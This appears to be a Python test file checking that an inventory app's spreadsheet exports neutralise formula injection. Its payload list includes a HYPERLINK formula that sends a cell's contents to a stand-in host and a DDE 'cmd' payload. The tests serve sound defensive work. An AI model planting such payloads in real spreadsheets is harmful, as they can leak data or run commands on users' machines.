"""#139: no exported workbook may hold a live formula built from a name or other text."""
import io

from openpyxl import load_workbook

from app.catalog import service as cat
from app.dataimport.service import export_catalog, template_xlsx
from app.procurement import deadstock
from app.procurement.service import suggestions_xlsx
from app.reports.export import xlsx as report_xlsx
from tests.helpers import DBTestCase

NASTY = ['=HYPERLINK("http://x.example/?"&B2,"open")', "+cmd|' /C calc'!A0", "-2+3", "@SUM(1,2)",
         "\t=1+1", "\r=2+2"]


class FormulaGuard(DBTestCase):
    def cells(self, data: bytes):
        wb = load_workbook(io.BytesIO(data))
        return [c for ws in wb.worksheets for row in ws.iter_rows() for c in row if c.value is not None]

    def assert_no_formula(self, data: bytes, expect: list[str]):
        cells = self.cells(data)
        self.assertEqual([c.coordinate for c in cells if c.data_type == "f"], [])
        values = {c.value for c in cells if c.data_type == "s"}
        for v in expect:
            self.assertIn(v, values)


class TestExports(FormulaGuard):
    def test_items_export(self):
        for i, n in enumerate(NASTY):
            cat.create_item(self.db, self.ctx, {"name_en": n, "manufacturer": n, "code": f"=C{i}",
                                                "pack_size": 1, "public_price": 100}, force=True)
        # the catalog trims names on save, so "\t=1+1" is stored as "=1+1"
        self.assert_no_formula(export_catalog(self.db, self.ctx), [n.strip() for n in NASTY] + ["=C0"])

    def test_order_suggestions_export(self):
        it = cat.create_item(self.db, self.ctx, {"name_en": "Plain item", "pack_size": 1, "public_price": 100})
        rows = [{"item_id": it, "label": n, "suggested_packs": 2, "on_hand": -1, "days_of_cover": 3,
                 "confidence": "=1+1"} for n in NASTY]
        self.assert_no_formula(suggestions_xlsx(rows, self.db, self.ctx), NASTY + ["=1+1"])

    def test_deadstock_export(self):
        row = {"code": "=1", "name": NASTY[0], "company": NASTY[1], "qty": 1, "value": -5, "sold_in_period": 0,
               "months_of_cover": None, "nearest_expiry": None, "last_purchase": None, "supplier": NASTY[3],
               "note": NASTY[2]}
        rep = {"summary": [{"label": NASTY[4], "items": 1, "value": 5, "share": 1}], "stock_value": 5,
               "purchase_mistakes": {"items": 0, "value": 0}, "expiry": {"expired_value": 0, "within_6_months_value": 0},
               "as_of": "2026-11-11", "store": NASTY[5],
               "segments": {k: [row] for k, _ in deadstock.SEGMENTS},
               "expiry_batches": [{"code": "@x", "name": NASTY[0], "qty": 1, "value": 1, "expiry": "2026-12",
                                   "expired": False}]}
        data = deadstock.to_xlsx(rep)
        self.assert_no_formula(data, NASTY[:5] + ["=1", "@x"])
        # numbers stay numbers
        self.assertIn(-5, [c.value for c in self.cells(data) if c.data_type == "n"])

    def test_screen_report_export(self):
        spec = {"title": "=1+1", "sheets": [{"name": "r", "columns": [{"label": "@a"}, {"label": "n", "type": "int"}],
                                              "rows": [[n, 1] for n in NASTY], "total": ["-x", 6]}]}
        self.assert_no_formula(report_xlsx(spec), NASTY + ["=1+1", "@a", "-x"])

    def test_import_templates(self):
        for kind in ("items", "opening_stock", "suppliers", "customers"):
            self.assertEqual([c for c in self.cells(template_xlsx(kind)) if c.data_type == "f"], [])
